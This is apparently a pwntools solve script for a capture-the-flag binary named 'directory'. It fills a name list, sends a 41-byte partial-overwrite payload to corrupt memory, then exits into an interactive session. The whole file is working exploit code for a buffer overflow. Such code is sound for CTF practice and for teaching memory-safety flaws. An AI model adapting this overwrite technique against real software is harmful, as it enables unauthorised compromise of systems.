from pwn import *


binary = "src/directory"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *process_menu+759
continue
"""

if args.REMOTE:
    p = remote("localhost", 40001)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


### HELPER FUNCTIONS ###
def add_name(name : str):
    p.sendlineafter(b"> ", b"1")
    p.recvuntil(b"name: ")
    p.send(name.encode())


### FILL UP ###
for _ in range(9):
    add_name("A")


### PARTIAL OVERWRITE ###
add_name("c"*40 + '8')

# exit
p.sendlineafter(b"> ", b"4")

p.interactive()